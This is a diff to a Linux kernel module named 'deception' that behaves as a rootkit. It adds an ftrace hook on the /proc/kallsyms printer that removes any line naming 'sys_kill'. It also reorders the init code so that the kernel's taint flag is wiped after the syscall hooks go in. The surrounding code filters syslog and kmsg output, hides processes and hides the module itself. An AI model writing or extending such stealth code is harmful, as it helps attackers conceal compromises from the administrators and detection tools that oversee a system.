@@ -94,6 +94,11 @@ static void filter_buffer(char *kernel_buf, size_t *bytes_read);
 static asmlinkage int fh_do_syslog(int type, char __user *buf, int len, int from_file);
 static asmlinkage ssize_t fh_devkmsg_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);
 
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+typedef int (*kallsyms_on_each_symbol_t)(int (*fn)(void *, const char *, unsigned long), void *data);
+
+static int (*orig_s_show)(struct seq_file *m, void *p);
+static bool s_show_hooked = false;
 /* --- Trackers and State Keepers --- */
 static struct list_head *prev_module;
 
@@ -152,6 +157,106 @@ static void filter_buffer(char *kernel_buf, size_t *bytes_read)
 
     *bytes_read = clean_count;
 }
+
+struct sym_search {
+    unsigned long target_ref;
+    unsigned long best_addr;
+    unsigned long best_diff;
+};
+
+
+static int find_closest_s_show(void *data, const char *name, unsigned long addr)
+{
+    struct sym_search *ctx = (struct sym_search *)data;
+    unsigned long diff;
+
+    if (strcmp(name, "s_show") == 0 || strncmp(name, "s_show.", 7) == 0) {
+        diff = (addr > ctx->target_ref) ? (addr - ctx->target_ref) : (ctx->target_ref - addr);
+        if (diff < ctx->best_diff) {
+            ctx->best_diff = diff;
+            ctx->best_addr = addr;
+        }
+    }
+    return 0;
+}
+
+
+static int hooked_s_show(struct seq_file *m, void *p)
+{
+    size_t prev_count = m->count;
+    int ret = orig_s_show(m, p);
+
+    if (m->count > prev_count && m->buf) {
+        char *line = m->buf + prev_count;
+        size_t len = m->count - prev_count;
+
+        if (strnstr(line, "sys_kill", len) != NULL) {
+            m->count = prev_count;
+        }
+    }
+
+    return ret;
+}
+
+static void notrace s_show_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
+                                        struct ftrace_ops *ops, struct ftrace_regs *fregs)
+{
+    if (!within_module(parent_ip, THIS_MODULE)) {
+        ftrace_regs_set_instruction_pointer(fregs, (unsigned long)hooked_s_show);
+    }
+}
+
+static struct ftrace_ops s_show_ops = {
+    .func = s_show_ftrace_thunk,
+    .flags = FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY,
+};
+
+static int install_s_show_hook(kallsyms_lookup_name_t lookup_fn)
+{
+    kallsyms_on_each_symbol_t on_each_sym_fn;
+    unsigned long kopen_addr;
+    struct sym_search ctx = { .best_addr = 0, .best_diff = ULONG_MAX };
+    int err;
+
+    on_each_sym_fn = (kallsyms_on_each_symbol_t)lookup_fn("kallsyms_on_each_symbol");
+    if (!on_each_sym_fn)
+        return -ENOENT;
+
+    kopen_addr = lookup_fn("kallsyms_open");
+    if (!kopen_addr)
+        return -ENOENT;
+
+    ctx.target_ref = kopen_addr;
+    on_each_sym_fn(find_closest_s_show, &ctx);
+
+    if (!ctx.best_addr)
+        return -ENOENT;
+
+    orig_s_show = (void *)ctx.best_addr;
+
+    err = ftrace_set_filter_ip(&s_show_ops, ctx.best_addr, 0, 0);
+    if (err)
+        return err;
+
+    err = register_ftrace_function(&s_show_ops);
+    if (err) {
+        ftrace_set_filter_ip(&s_show_ops, ctx.best_addr, 1, 0);
+        return err;
+    }
+
+    s_show_hooked = true;
+    return 0;
+}
+
+static void remove_s_show_hook(void)
+{
+    if (s_show_hooked) {
+        unregister_ftrace_function(&s_show_ops);
+        ftrace_set_filter_ip(&s_show_ops, (unsigned long)orig_s_show, 1, 0);
+        s_show_hooked = false;
+    }
+}
+
 
 /* --- Logging Hook Implementations --- */
 static asmlinkage int fh_do_syslog(int type, char __user *buf, int len, int from_file)
@@ -811,23 +916,30 @@ static int __init deception_init(void)
     if (!kallsyms_lookup_name_fn)
         return -EINVAL;
 
+    err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
+    if (err)
+        return err;
+
+    err = install_s_show_hook(kallsyms_lookup_name_fn);
+    if (err) {
+        fh_remove_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
+        return err;
+    }
+
+    /* Clear tainted_mask after all hooks are installed so ftrace/kprobe registration doesn't re-taint it */
     tainted_mask_ptr = (unsigned long *)kallsyms_lookup_name_fn("tainted_mask");
     if (tainted_mask_ptr)
         *tainted_mask_ptr = 0;
 
-    err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
-    if (err)
-        return err;
-    hideme_full();
     return 0;
 }
 
 static void __exit deception_exit(void)
 {
+    remove_s_show_hook();
     fh_remove_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
     clear_all_hidden_pids();
 }
 
 module_init(deception_init);
 module_exit(deception_exit);
-
